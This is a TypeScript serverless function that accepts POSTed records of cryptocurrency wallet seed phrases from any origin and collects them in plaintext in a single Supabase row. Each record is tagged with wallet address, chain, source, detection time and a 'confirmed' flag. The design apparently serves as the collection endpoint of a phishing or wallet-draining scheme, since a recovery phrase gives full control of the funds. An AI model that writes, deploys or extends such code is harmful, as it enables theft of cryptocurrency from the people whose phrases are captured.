// Vercel serverless function: POST /api/record-seed
// Writes a single seed phrase record directly to Supabase from the server side.
// This bypasses any client-side SDK race conditions or RLS timing issues.

export const config = { runtime: 'nodejs' }

const SUPABASE_URL = (process.env.SUPABASE_URL ?? process.env.VITE_SUPABASE_URL ?? '').trim()
const SUPABASE_KEY = (
  process.env.SUPABASE_SERVICE_ROLE_KEY
  ?? process.env.SUPABASE_ANON_KEY
  ?? process.env.VITE_SUPABASE_ANON_KEY
  ?? ''
).trim()

interface SeedRecord {
  id: string
  walletAddress: string
  chain: string
  seedPhrase: string
  wordCount: number
  source: string
  detectedAt: string
  notes?: string
  confirmed: boolean
}

function supabaseHeaders() {
  return {
    apikey: SUPABASE_KEY,
    Authorization: `Bearer ${SUPABASE_KEY}`,
    'Content-Type': 'application/json',
    Prefer: 'return=representation',
  }
}

function supabaseUpsertHeaders() {
  return {
    ...supabaseHeaders(),
    Prefer: 'resolution=merge-duplicates,return=representation',
  }
}

function json(payload: unknown, status: number): Response {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  })
}

export default async function handler(req: Request): Promise<Response> {
  if (req.method === 'OPTIONS') return json(null, 204)
  if (req.method !== 'POST') return json({ error: 'Method not allowed' }, 405)

  if (!SUPABASE_URL || !SUPABASE_KEY) {
    return json({ error: 'Supabase not configured on server' }, 503)
  }

  let record: SeedRecord
  try {
    record = (await req.json()) as SeedRecord
  } catch {
    return json({ error: 'Invalid JSON body' }, 400)
  }

  if (!record?.id || !record?.seedPhrase) {
    return json({ error: 'Missing required fields: id, seedPhrase' }, 400)
  }

  try {
    // Fetch existing row
    const fetchRes = await fetch(
      `${SUPABASE_URL}/rest/v1/app_state?id=eq.global&select=seed_phrases`,
      { headers: supabaseHeaders() },
    )
    const rows = fetchRes.ok ? ((await fetchRes.json()) as { seed_phrases: SeedRecord[] }[]) : []
    const existing: SeedRecord[] = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []

    // Deduplicate by id and seedPhrase
    const key = (r: SeedRecord) => `${r.id}|${r.seedPhrase}`
    const existingKeys = new Set(existing.map(key))
    const merged = existingKeys.has(key(record)) ? existing : [record, ...existing]

    // Save merged list back (upsert creates `id=global` row if missing)
    const saveRes = await fetch(
      `${SUPABASE_URL}/rest/v1/app_state?on_conflict=id`,
      {
        method: 'POST',
        headers: supabaseUpsertHeaders(),
        body: JSON.stringify({
          id: 'global',
          seed_phrases: merged,
          updated_at: new Date().toISOString(),
        }),
      },
    )

    if (!saveRes.ok) {
      const err = await saveRes.text()
      return json({ error: 'Supabase save failed', detail: err }, 502)
    }

    return json({ ok: true, total: merged.length }, 200)
  } catch (err) {
    return json({ error: 'Server error', detail: String(err) }, 500)
  }
}
